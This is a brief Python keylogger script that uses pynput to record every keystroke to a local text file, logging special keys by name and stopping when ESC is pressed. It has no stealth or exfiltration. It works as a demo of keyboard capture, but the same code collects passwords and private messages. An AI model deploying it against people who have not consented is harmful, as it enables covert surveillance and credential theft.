from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        # Log alphanumeric keys
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Log special keys
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key.name}]")

def on_release(key):
    # Stop listener on pressing ESC key
    if key == keyboard.Key.esc:
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
